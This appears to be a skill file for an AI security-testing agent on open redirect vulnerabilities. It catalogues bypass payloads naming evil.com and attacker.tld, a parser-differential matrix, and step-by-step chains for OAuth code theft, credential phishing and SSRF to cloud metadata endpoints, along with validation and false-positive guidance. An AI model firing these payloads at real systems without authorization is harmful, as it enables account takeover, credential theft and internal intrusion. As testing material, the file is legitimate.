---
name: open-redirect
description: Open redirect testing for phishing pivots, OAuth token theft, and allowlist bypass
---

# Open Redirect

Open redirects enable phishing, OAuth/OIDC code and token theft, and allowlist bypass in server-side fetchers that follow redirects. Treat every redirect target as untrusted: canonicalize and enforce exact allowlists per scheme, host, and path.

For 2024–2026 CVE mechanism decompositions (authentik CVE-2024-52289, urllib3 CVE-2025-50181 and CVE-2025-50182, URL-parser-disagreement SSRF via vLLM CVE-2026-25960), the measured 2026 URL-parser differentials with loopback-dispatch SSRF proof, the Claroty/Snyk 16-library framework's current frontier status, and the OAuth 2.1 / RFC 9700 strict-redirect-URI shift, load `open_redirect_novel_deep.md`. For the five inconsistency classes (scheme / slash / backslash / URL-encoded-data / scheme-mixup), framework-specific redirect sinks, OAuth redirect_uri chain depth, SPA/service-worker/WebSocket sinks, server-side fetcher SSRF chains, and composite-chain construction, load `open_redirect_advanced_deep.md`.

## Attack Surface

**Server-Driven Redirects**
- HTTP 3xx Location

**Client-Driven Redirects**
- `window.location`, meta refresh, SPA routers

**OAuth/OIDC/SAML Flows**
- `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `returnTo`/`continue`/`next`

**Multi-Hop Chains**
- Only first hop validated

**Fetcher Pipelines**
- Server-side link unfurlers, webhook delivery, image fetchers, PDF-from-URL converters, OpenGraph scrapers — any pipeline that follows redirects composes with open redirect into SSRF

## High-Value Targets

- Login/logout, password reset, SSO/OAuth flows
- Payment gateways, email links, invite/verification
- Unsubscribe, language/locale switches
- `/out` or `/r` redirectors
- Webhook delivery endpoints, link preview pipelines, image fetchers, OpenGraph scrapers
- OIDC `post_logout_redirect_uri` (routinely validated more weakly than `redirect_uri`)

## Reconnaissance

### Injection Points

- Params: `redirect`, `url`, `next`, `return_to`, `returnUrl`, `continue`, `goto`, `target`, `callback`, `out`, `dest`, `back`, `to`, `r`, `u`
- OAuth/OIDC/SAML: `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `state`
- SPA: `router.push`/`replace`, `location.assign`/`href`, meta refresh, `window.open`
- Headers: `Host`, `X-Forwarded-Host`/`Proto`, `Referer`; server-side Location echo
- Config fields: webhook destination, image fetch URL, link preview target, API callback URL

### Library and Framework Fingerprinting

Identify the server's URL-parser and HTTP-fetcher libraries before firing — the measured matrix below tells you which primitives are live against which parser pairs.

- **Error strings and response shapes** leak the framework: `IsLocalUrl must be used with absolute URL` indicates ASPNET; `url_has_allowed_host_and_scheme` in a stack trace indicates Django; `redirect_to with :only_path => true` indicates Rails.
- **Dependency manifests**: `requirements.txt`, `Pipfile.lock`, `package-lock.json`, `Gemfile.lock`, `pyproject.toml`, `/.well-known/dependency-manifest` endpoints.
- **Response-header patterns**: specific CDN/proxy headers (`CF-Ray`, `X-Served-By`) narrow the deployment shape.
- **OIDC discovery**: `/.well-known/openid-configuration` reveals the authorization server (`authentik`, `keycloak`, `auth0`, etc.).

### Parser Differentials

**Userinfo**
- `https://trusted.com@evil.com` → validators parse host as trusted.com, browser navigates to evil.com
- Variants: `trusted.com%40evil.com`, `a%40evil.com%40trusted.com`

**Backslash and Slashes**
- `https://trusted.com\evil.com`, `https://trusted.com\@evil.com`, `///evil.com`, `/\evil.com`

**Whitespace and Control**
- `http%09://evil.com`, `http%0A://evil.com`, `trusted.com%09evil.com`

**Fragment and Query**
- `trusted.com#@evil.com`, `trusted.com?//@evil.com`, `?next=//evil.com#@trusted.com`

**Unicode and IDNA**
- Punycode/IDN: `truѕted.com` (Cyrillic), `trusted.com。evil.com` (full-width dot), trailing dot

### Per-Language Parser Differentials

An open redirect is almost always a disagreement between the parser the
**validator** uses and the parser the **browser/fetcher** uses. The matrix
below is the extracted host from each stack's standard parser, verified
empirically (Python 3.14 `urllib.parse.urlparse().hostname`, PHP 8.4
`parse_url(PHP_URL_HOST)`, Node 24 `url.parse().hostname`, Go 1.26 `net/url`
`Hostname()`, Ruby 3.3 `URI.parse().host`, and WHATWG `new URL().hostname`,
which is also what a browser navigates to). Two families emerge — **lenient**
(Python / PHP / Node legacy: treat `\` as an ordinary character) and **strict**
(Go / Ruby: reject `\` and control characters) — and both diverge from WHATWG.

| Payload | Lenient (Python/PHP/Node `url.parse`) | Strict (Go/Ruby) | WHATWG (`new URL` / browser) | Exploit condition |
|---|---|---|---|---|
| `https://evil.com\@good.com` | `good.com` (backslash kept in userinfo) | throw | `evil.com` (`\`→`/`, so host is `evil.com`) | **lenient validator passes `good.com`, browser navigates `evil.com`** — the headline bypass |
| `https://good.com\@evil.com` | `evil.com` | throw | `good.com` | reverse: a WHATWG-based validator passes `good.com` while a lenient one blocks it |
| `https:/evil.com` (one slash) | no host | empty / nil | `evil.com` | any validator treating "no host ⇒ relative ⇒ safe" is bypassed — browser resolves to `evil.com` |
| `https:evil.com` (no slash) | no host | empty / nil | `evil.com` | same as above |
| `/\evil.com` | no host (relative) | Go empty / Ruby throw | resolves to `//evil.com` → `evil.com` on navigation | validator sees a relative path; browser navigates external |

Two rules follow. (1) A `\` before the `@`/host on a special scheme is the
most reliable allowlist bypass against Python/PHP/Node-`url.parse` validators,
because only WHATWG converts `\`→`/`. (2) The scheme-with-one-or-zero-slash
forms (`https:/evil.com`, `https:evil.com`) look host-less to every server
parser but are real navigations in a browser — deadly when the validator's
logic is "if `urlparse(x).hostname` is not in the allowlist *and not empty*,
allow" (empty ⇒ assumed same-origin).

Fingerprint the target's stack, then re-run this matrix against its actual
parser rather than assuming — the reproduction harness:
```bash
python3 -c "from urllib.parse import urlparse as u;print(u('https://evil.com\\\\@good.com').hostname)"   # good.com
node   -e "console.log(new URL('https://evil.com\\\\@good.com').hostname)"                                 # evil.com
php    -r "echo parse_url('https://evil.com\\@good.com', PHP_URL_HOST);"                                   # good.com
```
`new URL(x)` throws on a base-less scheme-relative input (`//evil.com`,
`/\evil.com`), so a validator wrapping it in `try{}catch{reject}` is safe for
those — but if the app then forwards the *raw* value to a `Location:` header
or `location =`, the browser still navigates to `evil.com`. Validate the
value you actually emit, not a re-parse of it.

For the measured 2026 differential between CPython 3.12/3.13 and urllib3 2.8.0, including a demonstrated loopback-dispatch SSRF proof, and for the five inconsistency classes with full exploitation methodology, load `open_redirect_advanced_deep.md § Backslash Confusion Class` and `open_redirect_novel_deep.md § Measured 2026 URL-Parser Differentials`.

### Encoding Bypasses

- Double encoding: `%2f%2fevil.com`, `%252f%252fevil.com`
- Mixed case and scheme smuggling: `hTtPs://evil.com`, `http:evil.com`
- IP variants: decimal 2130706433, octal 0177.0.0.1, hex 0x7f.1, IPv6 `[::ffff:127.0.0.1]`
- User-controlled path bases: `/out?url=/\evil.com`
- Fully-encoded scheme-host: `https%3A%2F%2Fevil.com/` (some lenient parsers decode before reject)

The deep-research pass confirmed one URL-encoded primitive does NOT reproduce on current CPython/urllib3: percent-encoded loopback addresses (`http://%67oogle.com`, percent-encoded `127.0.0.1`) do not cause urllib/requests to dispatch to localhost. Do not spray this payload — it burns stealth budget without producing primitives. For URL-encoded primitives that DO reproduce, load `open_redirect_advanced_deep.md § URL-Encoded Data Confusion Class`.

## Key Vulnerabilities

### Allowlist Evasion

**Common Mistakes**
- Substring/regex contains checks: allows `trusted.com.evil.com`
- Wildcards: `*.trusted.com` also matches `attacker.trusted.com.evil.net`
- Missing scheme pinning: `data:`, `javascript:`, `file:`, `gopher:` accepted
- Case/IDN drift between validator and browser
- Unescaped regex metacharacters in registered URIs (the authentik CVE-2024-52289 class — mechanism in `open_redirect_novel_deep.md § authentik Redirect-URI Regex-Metacharacter Bypass`)

**Robust Validation**
- Canonicalize with a single modern URL parser (WHATWG URL)
- Compare exact scheme, hostname (post-IDNA), and an explicit allowlist with optional exact path prefixes
- Require absolute HTTPS; reject protocol-relative `//` and unknown schemes
- Apply `re.escape` / `Pattern.quote` / `preg_quote` when compiling configuration strings to regex
- RFC 9700 and OAuth 2.1 (2024-2025) now require strict string equality for `redirect_uri` — load the novel sibling for the verifier-side implications

### OAuth/OIDC/SAML

**Redirect URI Abuse**
- Using an open redirect on a trusted domain for redirect_uri enables code interception
- Weak prefix/suffix checks: `https://trusted.com` → `https://trusted.com.evil.com`
- Path traversal/canonicalization: `/oauth/../../@evil.com`
- `post_logout_redirect_uri` often less strictly validated
- Regex-metacharacter allowlist bypass (authentik class; see novel sibling)

**Chaining an open redirect into code/token theft.** OAuth `redirect_uri`
must be an *exact registered* value, so a standalone open redirect on the
same trusted domain is the pivot that defeats exact-match validation:

1. The client registered `redirect_uri = https://app.example/callback` (exact).
2. `app.example` also hosts an open redirect at `/out?url=`.
3. Request authorization with the registered value but land on the redirector:
   `.../authorize?client_id=...&response_type=code&redirect_uri=https://app.example/out?url=https://attacker.tld/`
   — the IdP's exact match still passes (`redirect_uri` host/path is
   `app.example/out`, which may be registered or prefix-allowed), the code is
   delivered to `app.example/out`, which 302s to `attacker.tld` **with the
   `code`/`token` in the query or fragment**.
4. For the implicit/hybrid flow the `access_token`/`id_token` rides the
   fragment; a redirector that preserves the fragment (or a `response_mode`
   the app reflects) leaks it. Chain with a Referer leak when the redirect is
   a subresource.

Redirect-URI matching is itself a parser-differential surface (apply the
matrix above): the IdP validates one representation, the client's callback
handler parses another. Test `redirect_uri` with the backslash, single-slash,
userinfo, and encoded-slash payloads — a lenient IdP validator that extracts
`app.example` from `https://app.example\@attacker.tld` sends the code to the
browser's host, `attacker.tld`. Also test registration-time wildcards
(`https://*.app.example/cb` → register/takeover a sibling), and
`post_logout_redirect_uri`, `RelayState`, and `state`-carried return URLs,
which are routinely validated more weakly than `redirect_uri`.

For the full OAuth redirect_uri chain depth including PAR, SAML RelayState, scheme/port mismatches, hybrid-flow response capture, and wildcarded subdomain exploitation, load `open_redirect_advanced_deep.md § OAuth redirect_uri Chain — Advanced Depth`. For 2024–2026 OAuth-provider-specific CVEs (authentik regex-metachar) and the RFC 9700 strict-matching transition, load `open_redirect_novel_deep.md § OAuth 2.1 / RFC 9700 Strict Redirect-URI Matching Shift`.

### Client-Side Vectors

**JavaScript Redirects**
- `location.href`/`assign`/`replace` using user input
- Meta refresh `content=0;url=USER_INPUT`
- SPA routers: `router.push(searchParams.get('next'))`

**Client-Side Redirect Sink Catalog**

Trace the source (URL query/hash, `postMessage`, storage) to a navigation
sink; a `javascript:`/`data:` value in any of these is DOM-XSS, a
cross-origin `https:` value is open redirect:
- `location`, `location.href`, `location.assign()`, `location.replace()`, `window.open()`
- `<meta http-equiv=refresh content="0;url=...">` injected into the DOM
- framework routers that call the above from a query/hash param: React Router `navigate()`, Next.js `router.push()`/`redirect()`, Vue Router `router.push()`, Angular `Router.navigateByUrl()`
- `<a href>` / `<form action>` / `<base href>` set from input
- server-issued `Location` echoed from a client value
- Service Worker fetch handlers routing to attacker URLs
- `postMessage`-driven navigation without origin check

Two client-only nuances the server-side matrix misses:
- **Scheme not validated** — `location = params.get('next')` with `next=javascript:alert(1)` executes (self-XSS→redirect chain); allowlist the scheme, not just the host.
- **Same-origin path that the router re-fetches** — a `next=/\evil.com` handed to `router.push` can become a cross-origin navigation after the browser normalizes `/\`→`//`. Load `browser_security` for the client-side path-traversal / navigation state-machine (source decoding, router vs `fetch` differences, and how each browser resolves the final URL).

### Reverse Proxies and Gateways

- Host/X-Forwarded-* may change absolute URL construction
- CDNs that follow redirects for link checking can leak tokens when chained
- `X-Original-URL` / `X-Rewrite-URL` on IIS and reverse proxies can shift the application's view of the request URL
- Trusted-proxy IP lists (10.x, 192.168.x) that allow attacker-controlled headers from cloud-adjacent networks

### SSRF Chaining

- Server-side fetchers (web previewers, link unfurlers) follow 3xx
- Combine with an open redirect on an allowlisted domain to pivot to internal targets (169.254.169.254, localhost)
- urllib3 `retries=False` does NOT disable redirects pre-2.5.0 (CVE-2025-50181 class — mechanism in `open_redirect_novel_deep.md § urllib3 CVE-2025-50181`)
- URL-parser disagreement between validator and fetcher produces SSRF even when both are considered modern (vLLM CVE-2026-25960 class — case study in novel sibling)

### Multi-Hop Validation

- Validators that validate only the first hop in a redirect chain accept open-redirect-at-first-hop chains that reach arbitrary targets
- Fetchers that re-validate every hop still expose parser-differential bugs at each hop

## Exploitation Scenarios

### OAuth Code Interception

1. Set redirect_uri to `https://trusted.example/out?url=https://attacker.tld/cb`
2. IdP sends code to trusted.example which redirects to attacker.tld
3. Exchange code for tokens; demonstrate account access

### Phishing Flow

1. Send link on trusted domain: `/login?next=https://attacker.tld/fake`
2. Victim authenticates; browser navigates to attacker page
3. Capture credentials/tokens via cloned UI

### Internal Evasion

1. Server-side link unfurler fetches `https://trusted.example/out?u=http://169.254.169.254/latest/meta-data`
2. Redirect follows to metadata; confirm via timing/headers

### URL-Parser Disagreement SSRF

1. Target uses one URL parser (e.g., `urllib`) for validator and another (e.g., `urllib3`) for fetcher
2. Craft `http://127.0.0.1:<port>\@trusted.example.com/` — validator extracts `trusted.example.com` (passes), fetcher extracts `127.0.0.1`
3. Measured confirmation: loopback dispatch returns 200 with the internal server's response (reproduced in `open_redirect_novel_deep.md § Measured 2026 URL-Parser Differentials`)

## Testing Methodology

1. **Inventory surfaces** - Login/logout, password reset, SSO/OAuth flows, payment gateways, email links, webhook delivery, link preview endpoints
2. **Fingerprint libraries** - Identify validator parser and fetcher parser separately; the pair-asymmetry is the attack surface
3. **Build test matrix** - Scheme × host × path variants and encoding/unicode forms
4. **Compare behaviors** - Server-side validation vs browser navigation results; validator parser vs fetcher parser
5. **Multi-hop testing** - Trusted-domain → redirector → external; verify every hop or just the first
6. **Prove impact** - Credential phishing, OAuth code interception, internal egress, SSRF to metadata
7. **Confirm chain depth** - Does the fetcher follow redirects? How many hops? Does validation re-run?

## Validation

1. Produce a minimal URL that navigates to an external domain via the vulnerable surface; include the full address bar capture
2. Show bypass of the stated validation (regex/allowlist) using canonicalization variants
3. Test multi-hop: prove only first hop is validated and second hop escapes constraints
4. For OAuth/SAML, demonstrate code/RelayState delivery to an attacker-controlled endpoint
5. For SSRF-chained redirects, demonstrate dispatch to the internal target (loopback-return-200 is the strongest signal)
6. Pair positive-URL (attacker URL) with negative-control (benign URL) — rejection of the negative control proves the validator is live

## False Positives

- Redirects constrained to relative same-origin paths with robust normalization
- Exact pre-registered OAuth redirect_uri with strict verifier (RFC 9700-conformant)
- Validators using a single canonical parser and comparing post-IDNA host and scheme
- User prompts that show the exact final destination before navigating
- Redirect inside an iframe (same-origin bounded, not top-level navigation)
- Redirect to a known-safe third-party (Google login, documentation site)
- Redirect requiring UI confirmation (bounded by user's choice)

For the full advanced-tier false-positive discipline, load `open_redirect_advanced_deep.md § False Positives — Advanced`.

## Impact

- Credential and token theft via phishing and OAuth/OIDC interception
- Internal data exposure when server fetchers follow redirects
- Policy bypass where allowlists are enforced only on the first hop
- Cross-application trust erosion and brand abuse
- SSRF to cloud metadata services (EC2 IMDS, GCP metadata, Azure IMDS) when combined with fetcher redirect-follow
- Model-storage leak and sibling-pod reach in LLM-API deployments (URL-parser-disagreement class)

## Pro Tips

1. Always compare server-side canonicalization to real browser navigation; differences reveal bypasses
2. Try userinfo, protocol-relative, Unicode/IDN, and IP numeric variants early
3. In OAuth, prioritize `post_logout_redirect_uri` and less-discussed flows; they're often looser
4. Exercise multi-hop across distinct subdomains and paths
5. For SSRF chaining, target services known to follow redirects
6. Favor allowlists of exact origins plus optional path prefixes
7. Use the verified per-language parser matrix above and fingerprint the target's actual stack rather than spraying blind; for the general validator-vs-consumer disagreement model this is an instance of, load `semantic_confusion`
8. Fingerprint validator parser and fetcher parser separately — the pair-asymmetry is the attack surface for most real bugs
9. For OAuth deployments, check RFC 9700 adoption — mid-transition deployments have policy disagreement attacks
10. Do not spray URL-encoded loopback (`%67oogle.com`-style) — the primitive does not reproduce on current CPython + urllib3; it burns stealth budget

## Summary

Redirection is safe only when the final destination is constrained after canonicalization. Enforce exact origins, verify per hop, and treat client-provided destinations as untrusted across every stack. The 2024–2026 frontier concentrates on configuration-string-as-regex bugs (authentik), library-level redirect-control semantics (urllib3 2.5.0 fixes), and the enduring Claroty/Snyk parser-disagreement class — now with measured 2026 reproduction. Load the deep siblings for mechanism, measurement, and chain depth.
